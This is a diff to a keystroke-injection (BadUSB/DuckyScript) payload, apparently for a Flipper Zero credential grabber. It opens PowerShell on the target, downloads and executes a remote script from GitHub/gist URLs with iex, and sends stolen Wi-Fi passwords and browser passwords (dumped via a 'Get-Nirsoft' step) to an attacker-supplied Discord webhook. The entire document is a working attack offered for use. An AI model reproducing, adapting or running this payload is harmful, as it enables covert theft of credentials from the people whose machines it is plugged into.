@@ -1,9 +1,15 @@
+DELAY 2000
 GUI r
 DELAY 1000
 STRING powershell
 ENTER
 DELAY 1000
-STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/blobs0/Ultimate-Flipper-Grabber/main/payload.ps1'))
+STRING $DiscordUrl = 'your-discord-webhook'
+ENTER
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://gist.githubusercontent.com/blobs0/88d5880cf1a3b01aaed67500f044f996/raw'))
+ENTER
+DELAY 1000
+STRING Upload-Discord -file "$desktop\0.txt" -text "Wifi password :"; Del-Wifi-File
 ENTER
 STRING Get-Nirsoft
 ENTER
@@ -17,12 +23,10 @@ CTRL A
 CTRL S
 DELAY 1000
 STRING export
-TAB
-STRING h
 ENTER
 DELAY 1000
 ALT F4
-STRING Upload-Discord -file "export.txt" -text "Browser password :"
+STRING Upload-Discord -file "C:\temp\export.txt" -text "Browser password :"
 ENTER
 STRING cd \
 ENTER
